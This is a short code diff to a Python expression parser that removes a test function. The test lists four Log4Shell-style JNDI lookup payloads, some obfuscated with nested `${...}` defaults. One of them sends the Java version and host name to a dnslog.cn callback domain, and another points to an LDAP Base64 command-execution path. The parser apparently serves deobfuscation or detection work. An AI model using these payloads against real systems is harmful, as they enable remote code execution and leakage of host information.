@@ -30,15 +30,3 @@ def parse(exp: str):
             result += sub_exp
     result += "}"
     return result
-
-
-def test():
-    expressions = [
-        "${${cywqFn:aWJp:YXN:V:-j}${FndP:nSIUr:pJbLx:R:KF:-n}${knSFVj:EgkBg:-d}${RCFNT:cYMi:yRAS:hVn:-i}${XzOJt:YYM:M:NVahp:-:}${WPb:Y:jTeC:BgV:-l}${R:n:SOjjn:Y:YQT:-d}${ihFJ:FDiQy:-a}${JjH:VMFPM:KAckNV:yxFj:B:-p}${O:Caf:a:c:-:}${b:NLI:z:hMRSa:wGN:-/}${yYyyHt:hBYua:-/}${XbeEIz:gQryAt:-1}${uKdHwu:ynn:mhUqe:zO:QToeAb:-2}${bOHsD:nMlNF:uh:Fcy:PYK:-7}${UhWr:-.}${tUXKLg:rSsAEP:lDOD:S:-0}${B:-.}${iVxER:ERapiN:mBEb:-0}${ip:-.}${BqWhS:-1}${PyTrWo:MvSO:oaUOo:-:}${QjA:tHIoP:G:ILLK:-1}${U:AMi:-0}${NmKw:-9}${B:-9}${J:EI:cWy:XqyW:-/}${HMEf:EVlAY:kDTKiP:-o}${MK:jBUe:c:-b}${aE:T:rpBgI:SBX:xp:-j}}",
-        "${jndi:ldap://127.0.0.1#doma.in:1389/a}",
-        "${jndi:ldap://jv-${sys:java.version}-hn-${hostName}.subdomain.dnslog.cn/exp}",
-        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:12344/Basic/Command/Base64/Base64EncodedStuff}"
-    ]
-
-    for exp in expressions:
-        print(parse(exp))
